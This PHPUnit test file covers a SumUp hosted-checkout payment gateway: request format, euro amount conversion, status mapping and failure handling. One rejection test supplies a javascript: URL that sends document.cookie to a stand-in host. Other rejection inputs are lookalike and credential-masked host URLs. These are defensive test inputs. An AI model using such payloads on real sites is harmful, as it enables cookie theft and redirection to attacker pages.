<?php

declare(strict_types=1);

namespace App\Tests\Unit\Infrastructure\Payment;

use App\Application\Sales\CheckoutState;
use App\Application\Sales\OpenedCheckout;
use App\Application\Sales\PaymentState;
use App\Domain\Sales\Exception\PaymentUnavailable;
use App\Infrastructure\Payment\SumUpGateway;
use App\Tests\Support\Json;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Symfony\Component\HttpClient\MockHttpClient;
use Symfony\Component\HttpClient\Response\JsonMockResponse;
use Symfony\Component\HttpClient\Response\MockResponse;
use Symfony\Contracts\HttpClient\ResponseInterface;

final class SumUpGatewayTest extends TestCase
{
    private const string KEY = 'sup_sk_secret';
    private const string MERCHANT = 'MCODE42';
    private const string SECRET_ANSWER = 'merchant MCODE42 has no such checkout';

    /** @var list<array{string, string, array<mixed>}> */
    private array $requests = [];

    public function testOpeningAsksSumUpForAHostedCheckout(): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['id' => 'chk-1', 'status' => 'PENDING', 'hosted_checkout_url' => 'https://checkout.sumup.com/pay/chk-1']));

        $checkout = $gateway->open('ML-AB12-CD34', 1234, 'mossyleaf.studio order ML-AB12-CD34', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable('2026-11-20T10:30:00+00:00'));

        self::assertEquals(new OpenedCheckout('chk-1', 'https://checkout.sumup.com/pay/chk-1'), $checkout);
        self::assertCount(1, $this->requests);
        [$method, $url, $options] = $this->requests[0];
        self::assertSame(['POST', 'https://api.sumup.com/v0.1/checkouts'], [$method, $url]);
        self::assertSame(['Authorization: Bearer '.self::KEY], self::header($options, 'authorization'));
        self::assertSame(0, $options['max_redirects']);
        self::assertSame([10.0, 20.0], [$options['timeout'], $options['max_duration']]);
        self::assertSame([
            'checkout_reference' => 'ML-AB12-CD34',
            'amount' => 12.34,
            'currency' => 'EUR',
            'merchant_code' => self::MERCHANT,
            'description' => 'mossyleaf.studio order ML-AB12-CD34',
            'return_url' => 'https://shop.test/webhooks/sumup',
            'redirect_url' => 'https://shop.test/en/order/token',
            'valid_until' => '2026-11-20T10:30:00+00:00',
            'hosted_checkout' => ['enabled' => true],
        ], json_decode(self::body($options), true, flags: \JSON_THROW_ON_ERROR));
    }

    /** @return iterable<string, array{int, string}> */
    public static function amounts(): iterable
    {
        yield 'cents' => [1234, '12.34'];
        yield 'round euros' => [1000, '10'];
        yield 'one cent' => [1, '0.01'];
        yield 'a price that floats badly' => [1005, '10.05'];
        yield 'a large total' => [999999, '9999.99'];
    }

    #[DataProvider('amounts')]
    public function testTheAmountIsSentInEurosWithoutFloatDrift(int $cents, string $euros): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['id' => 'chk-1', 'hosted_checkout_url' => 'https://checkout.sumup.com/pay/chk-1']));

        $gateway->open('ML-AB12-CD34', $cents, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable('2026-11-20T10:30:00+00:00'));

        self::assertMatchesRegularExpression('/"amount":'.preg_quote($euros, '/').'(\.0+)?[,}]/', self::body($this->requests[0][2]));
    }

    /** @return iterable<string, array{string, PaymentState}> */
    public static function states(): iterable
    {
        yield 'pending' => ['PENDING', PaymentState::Pending];
        yield 'paid' => ['PAID', PaymentState::Paid];
        yield 'failed' => ['FAILED', PaymentState::Failed];
        yield 'expired' => ['EXPIRED', PaymentState::Expired];
    }

    #[DataProvider('states')]
    public function testFindingReadsTheStateOfTheCheckout(string $status, PaymentState $state): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['id' => 'chk/1', 'status' => $status, 'amount' => 19.99, 'currency' => 'EUR', 'checkout_reference' => 'ML-AB12-CD34', 'transactions' => []]));

        self::assertEquals(new CheckoutState($state, 'ML-AB12-CD34', 1999, 'EUR', null), $gateway->find('chk/1'));
        [$method, $url, $options] = $this->requests[0];
        self::assertSame(['GET', 'https://api.sumup.com/v0.1/checkouts/chk%2F1'], [$method, $url]);
        self::assertSame(['Authorization: Bearer '.self::KEY], self::header($options, 'authorization'));
        self::assertSame(0, $options['max_redirects']);
        self::assertSame([5.0, 8.0], [$options['timeout'], $options['max_duration']]);
    }

    public function testTheTransactionCodeIsTheOneOfTheSuccessfulTransaction(): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['status' => 'PAID', 'amount' => 10, 'currency' => 'EUR', 'checkout_reference' => 'ML-AB12-CD34', 'transactions' => [
            ['transaction_code' => 'TDECLINED', 'status' => 'FAILED'],
            ['transaction_code' => 'TPAID42', 'status' => 'SUCCESSFUL'],
            ['transaction_code' => 'TLATER', 'status' => 'FAILED'],
        ]]));

        self::assertEquals(new CheckoutState(PaymentState::Paid, 'ML-AB12-CD34', 1000, 'EUR', 'TPAID42'), $gateway->find('chk-1'));
    }

    public function testWithoutASuccessfulTransactionTheLastCodeIsKept(): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['status' => 'FAILED', 'amount' => 10.5, 'currency' => 'EUR', 'checkout_reference' => 'ML-AB12-CD34', 'transactions' => [
            ['transaction_code' => 'TFIRST'],
            ['transaction_code' => 'TSECOND', 'status' => 'FAILED'],
            ['transaction_code' => str_repeat('T', 65), 'status' => 'FAILED'],
        ]]));

        self::assertSame([1050, 'TSECOND'], [$gateway->find('chk-1')->amount, $gateway->find('chk-1')->transactionCode]);
    }

    public function testACheckoutSumUpDoesNotKnowIsExpired(): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['error_code' => 'NOT_FOUND', 'message' => self::SECRET_ANSWER], ['http_code' => 404]));

        $checkout = $gateway->find('chk-1');

        self::assertSame(PaymentState::Expired, $checkout->state);
        self::assertNull($checkout->transactionCode);
    }

    public function testOpeningAnswered404IsAFailure(): void
    {
        $gateway = $this->gateway(new JsonMockResponse(['error_code' => 'NOT_FOUND'], ['http_code' => 404]));

        self::failure(static fn () => $gateway->open('ML-AB12-CD34', 1234, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable()));
    }

    /** @return iterable<string, array{ResponseInterface}> */
    public static function failures(): iterable
    {
        yield 'a client error' => [new JsonMockResponse(['error_code' => 'UNAUTHORIZED', 'message' => self::SECRET_ANSWER], ['http_code' => 401])];
        yield 'too many requests' => [new JsonMockResponse(['message' => self::SECRET_ANSWER], ['http_code' => 429])];
        yield 'a server error' => [new JsonMockResponse(['detail' => self::SECRET_ANSWER, 'title' => self::SECRET_ANSWER], ['http_code' => 500, 'response_headers' => ['content-type' => 'application/problem+json']])];
        yield 'a redirect' => [new MockResponse(self::SECRET_ANSWER, ['http_code' => 302, 'response_headers' => ['location' => 'https://elsewhere.test/']])];
        yield 'a timeout' => [new MockResponse((static function (): \Generator {
            yield '';
        })())];
        yield 'a transport error' => [new MockResponse('', ['error' => self::SECRET_ANSWER])];
        yield 'an unreadable body' => [new MockResponse(self::SECRET_ANSWER, ['response_headers' => ['content-type' => 'application/json']])];
        yield 'a body without the expected fields' => [new JsonMockResponse(['message' => self::SECRET_ANSWER])];
    }

    /** @return iterable<string, array{ResponseInterface}> */
    public static function unreadableCheckouts(): iterable
    {
        yield 'an unknown status' => [new JsonMockResponse(['status' => 'REFUNDED', 'amount' => 10, 'currency' => 'EUR', 'checkout_reference' => 'ML-AB12-CD34'])];
        yield 'an amount that is not a number' => [new JsonMockResponse(['status' => 'PAID', 'amount' => '10', 'currency' => 'EUR', 'checkout_reference' => 'ML-AB12-CD34'])];
        yield 'no reference' => [new JsonMockResponse(['status' => 'PAID', 'amount' => 10, 'currency' => 'EUR'])];
        yield 'no currency' => [new JsonMockResponse(['status' => 'PAID', 'amount' => 10, 'checkout_reference' => 'ML-AB12-CD34'])];
    }

    #[DataProvider('failures')]
    public function testOpeningFailsWithoutRepeatingSumUp(ResponseInterface $response): void
    {
        $gateway = $this->gateway($response);

        $failure = self::failure(static fn () => $gateway->open('ML-AB12-CD34', 1234, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable()));

        self::assertStringNotContainsString(self::SECRET_ANSWER, $failure->getMessage());
        self::assertNull($failure->getPrevious());
    }

    #[DataProvider('failures')]
    #[DataProvider('unreadableCheckouts')]
    public function testFindingFailsWithoutRepeatingSumUp(ResponseInterface $response): void
    {
        $gateway = $this->gateway($response);

        $failure = self::failure(static fn () => $gateway->find('chk-1'));

        self::assertStringNotContainsString(self::SECRET_ANSWER, $failure->getMessage());
        self::assertNull($failure->getPrevious());
    }

    /** @return iterable<string, array{array<string, mixed>}> */
    public static function unusableCheckouts(): iterable
    {
        yield 'an id too long to store' => [['id' => str_repeat('a', 256), 'hosted_checkout_url' => 'https://checkout.sumup.com/pay/a']];
        yield 'an empty id' => [['id' => '', 'hosted_checkout_url' => 'https://checkout.sumup.com/pay/a']];
        yield 'no hosted page' => [['id' => 'chk-1', 'hosted_checkout_url' => 7]];
        yield 'a script instead of a page' => [['id' => 'chk-1', 'hosted_checkout_url' => "javascript:fetch('//x/'+document.cookie)"]];
        yield 'a page without https' => [['id' => 'chk-1', 'hosted_checkout_url' => 'http://checkout.sumup.com/pay/chk-1']];
        yield 'a page of another host' => [['id' => 'chk-1', 'hosted_checkout_url' => 'https://pay.example/chk-1']];
        yield 'a host that only starts like SumUp' => [['id' => 'chk-1', 'hosted_checkout_url' => 'https://sumup.com.pay.example/chk-1']];
        yield 'a host hidden behind credentials' => [['id' => 'chk-1', 'hosted_checkout_url' => 'https://checkout.sumup.com@pay.example/chk-1']];
        yield 'a relative page' => [['id' => 'chk-1', 'hosted_checkout_url' => '/_fake/sumup/chk-1']];
    }

    /** @param array<string, mixed> $answer */
    #[DataProvider('unusableCheckouts')]
    public function testAnUnusableCheckoutIsAFailure(array $answer): void
    {
        $gateway = $this->gateway(new JsonMockResponse($answer));

        self::failure(static fn () => $gateway->open('ML-AB12-CD34', 1234, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable()));
    }

    /** @return iterable<string, array{string, string}> */
    public static function missingSettings(): iterable
    {
        yield 'no key' => ['', self::MERCHANT];
        yield 'no merchant' => [self::KEY, ''];
        yield 'blank key' => ['  ', self::MERCHANT];
        yield 'nothing' => ['', ''];
    }

    #[DataProvider('missingSettings')]
    public function testWithoutBothSettingsTheGatewayIsNotReadyAndCallsNothing(string $key, string $merchant): void
    {
        $http = new MockHttpClient(new JsonMockResponse(['id' => 'chk-1']));
        $gateway = new SumUpGateway($http, $key, $merchant);

        self::assertFalse($gateway->isReady());
        self::failure(static fn () => $gateway->open('ML-AB12-CD34', 1234, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable()));
        self::failure(static fn () => $gateway->find('chk-1'));
        self::assertSame(0, $http->getRequestsCount());
    }

    public function testTheSettingsAreSentWithoutTheSpacesAroundThem(): void
    {
        $gateway = new SumUpGateway(new MockHttpClient(function (string $method, string $url, array $options): ResponseInterface {
            $this->requests[] = [$method, $url, $options];

            return new JsonMockResponse(['id' => 'chk-1', 'hosted_checkout_url' => 'https://checkout.sumup.com/pay/chk-1']);
        }), ' '.self::KEY."\n", "\t".self::MERCHANT.' ');

        $gateway->open('ML-AB12-CD34', 1234, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable());

        self::assertSame(['Authorization: Bearer '.self::KEY], self::header($this->requests[0][2], 'authorization'));
        self::assertSame(self::MERCHANT, Json::string(json_decode(self::body($this->requests[0][2]), true, flags: \JSON_THROW_ON_ERROR), 'merchant_code'));
    }

    public function testAnotherHostedPageCanBeAllowed(): void
    {
        $gateway = new SumUpGateway(new MockHttpClient(new JsonMockResponse(['id' => 'chk-1', 'hosted_checkout_url' => '/_fake/sumup/chk-1'])), self::KEY, self::MERCHANT, '#^/_fake/sumup/#');

        self::assertSame('/_fake/sumup/chk-1', $gateway->open('ML-AB12-CD34', 1234, 'order', 'https://shop.test/webhooks/sumup', 'https://shop.test/en/order/token', new \DateTimeImmutable())->url);
    }

    public function testWithBothSettingsTheGatewayIsReady(): void
    {
        self::assertTrue(new SumUpGateway(new MockHttpClient(), self::KEY, self::MERCHANT)->isReady());
    }

    private function gateway(ResponseInterface $response): SumUpGateway
    {
        return new SumUpGateway(new MockHttpClient(function (string $method, string $url, array $options) use ($response): ResponseInterface {
            $this->requests[] = [$method, $url, $options];

            return $response;
        }), self::KEY, self::MERCHANT);
    }

    private static function failure(\Closure $call): PaymentUnavailable
    {
        try {
            $call();
        } catch (PaymentUnavailable $failure) {
            self::assertSame('sales.payment_unavailable', $failure->getMessage());

            return $failure;
        }

        self::fail('The gateway did not fail.');
    }

    /**
     * @param array<mixed> $options
     *
     * @return list<mixed>
     */
    private static function header(array $options, string $name): array
    {
        $headers = $options['normalized_headers'];
        self::assertIsArray($headers);
        $values = $headers[$name] ?? [];
        self::assertIsArray($values);

        return array_values($values);
    }

    /** @param array<mixed> $options */
    private static function body(array $options): string
    {
        self::assertIsString($options['body']);

        return $options['body'];
    }
}
